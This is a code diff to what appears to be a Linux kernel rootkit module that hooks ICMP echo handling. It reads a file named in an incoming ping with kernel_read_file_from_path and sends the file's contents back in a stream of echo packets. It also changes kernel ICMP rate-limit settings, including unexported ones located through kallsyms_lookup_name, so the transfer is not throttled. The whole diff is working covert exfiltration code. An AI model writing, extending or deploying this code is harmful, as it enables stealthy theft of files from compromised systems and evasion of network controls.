@@ -1825,7 +1825,7 @@ static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
 		return real_icmp_echo(skb);
 }
 
-static inline void set_seq(struct icmphdr *icmph, unsigned short seq)
+static void set_seq(struct icmphdr *icmph, unsigned short seq)
 {
 	if (icmph)
 		goto end;
@@ -1834,6 +1834,73 @@ static inline void set_seq(struct icmphdr *icmph, unsigned short seq)
 end:
 	return;
 }
+
+struct icmp_echo_limit {
+	int sysctl_icmp_echo_ignore_all;
+        int sysctl_icmp_echo_ignore_broadcasts;
+        int sysctl_icmp_ignore_bogus_error_responses;
+        int sysctl_icmp_ratelimit;
+        int sysctl_icmp_ratemask;
+        int sysctl_icmp_errors_use_inbound_ifaddr;
+	
+	int sysctl_icmp_msgs_per_sec;
+	int *p_sysctl_icmp_msgs_per_sec;
+	int sysctl_icmp_msgs_burst;
+	int *p_sysctl_icmp_msgs_burst;
+
+} origin_limit = {0};
+
+static int disable_icmp_echo_limit(struct net *net)
+{
+	if (!net)
+		goto end;
+
+	origin_limit.sysctl_icmp_echo_ignore_all = net->ipv4.sysctl_icmp_echo_ignore_all;
+	if (origin_limit.sysctl_icmp_echo_ignore_all)
+		net->ipv4.sysctl_icmp_echo_ignore_all = 0;
+
+	origin_limit.sysctl_icmp_ratelimit = net->ipv4.sysctl_icmp_ratelimit;
+	if (origin_limit.sysctl_icmp_ratelimit)
+		net->ipv4.sysctl_icmp_ratelimit = INT_MAX;
+
+	origin_limit.sysctl_icmp_ratemask = net->ipv4.sysctl_icmp_ratemask;
+	if (origin_limit.sysctl_icmp_ratemask & (1<<ICMP_ECHO))
+		net->ipv4.sysctl_icmp_ratemask &= ~(1<<ICMP_ECHO);
+
+	if (!origin_limit.p_sysctl_icmp_msgs_per_sec)
+		origin_limit.p_sysctl_icmp_msgs_per_sec = (int*)kallsyms_lookup_name("sysctl_icmp_msgs_per_sec");
+	if (origin_limit.p_sysctl_icmp_msgs_per_sec) {  
+		origin_limit.sysctl_icmp_msgs_per_sec = *origin_limit.p_sysctl_icmp_msgs_per_sec;
+		*origin_limit.p_sysctl_icmp_msgs_per_sec = INT_MAX;	
+	}
+
+	if (!origin_limit.p_sysctl_icmp_msgs_burst)
+		origin_limit.p_sysctl_icmp_msgs_burst = (int*)kallsyms_lookup_name("sysctl_icmp_msgs_burst");
+	if (origin_limit.p_sysctl_icmp_msgs_burst) { 
+		origin_limit.sysctl_icmp_msgs_burst = *origin_limit.p_sysctl_icmp_msgs_burst;
+		*origin_limit.p_sysctl_icmp_msgs_burst = INT_MAX;	
+	}
+
+end:
+	return 0;
+} 
+
+static int enable_icmp_echo_limit(struct net *net)
+{
+	if (!net)
+		goto end;
+
+	net->ipv4.sysctl_icmp_echo_ignore_all = origin_limit.sysctl_icmp_echo_ignore_all;
+	net->ipv4.sysctl_icmp_ratelimit = origin_limit.sysctl_icmp_ratelimit;
+	net->ipv4.sysctl_icmp_ratemask = origin_limit.sysctl_icmp_ratemask;
+
+	if (origin_limit.p_sysctl_icmp_msgs_per_sec)
+		*origin_limit.p_sysctl_icmp_msgs_per_sec = origin_limit.sysctl_icmp_msgs_per_sec;
+	if (origin_limit.p_sysctl_icmp_msgs_burst)
+		*origin_limit.p_sysctl_icmp_msgs_burst = origin_limit.sysctl_icmp_msgs_burst;
+end:
+	return 0;
+} 
 
 static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int buf_len)
 {
@@ -1856,27 +1923,38 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	rc = kernel_read_file_from_path(fname, &data, &file_size, INT_MAX, 0);
 	if (rc < 0)
 		goto end;
+	printk(KERN_INFO "fname:%s, size:%llu", fname, file_size);
+
+	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 
 	size = 0;
 	seq = ntohs(icmp_hdr(skb)->un.echo.sequence);
+	skb2 = skb_copy(skb, GFP_ATOMIC);
+	if (!skb2)
+		goto end;
+	icmph = icmp_hdr(skb2);
+	cmd = (char *)icmph + sizeof(struct icmphdr);
+
 	while (file_size > 0) {
 		len = file_size > buf_len ? buf_len : file_size;
-		skb2 = skb_copy(skb, GFP_ATOMIC);
-		if (!skb2)
-			break;
 
-		icmph = icmp_hdr(skb2);
-		cmd = (char *)icmph + sizeof(struct icmphdr);
-		memcpy(cmd+LEN_PREFIX_CMD+l_name, data+size, len);
+		skb_get(skb2);
+		memcpy(cmd+LEN_PREFIX_CMD+l_name+1, data+size, len);
 
-	//	skb_get(skb);
-		set_seq(icmph, seq++);
+		set_seq(icmph, seq);
+		seq++;
 		real_icmp_echo(skb2);
 		file_size -= len;
 		size += len;
 	}
+	printk(KERN_INFO "fname:%s, tran size:%llu\n", fname, size);
 
 end:
+	if (skb2)
+		kfree_skb(skb2);
+
+	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
+
 	if (data)
 		vfree(data);
 	if (fname)
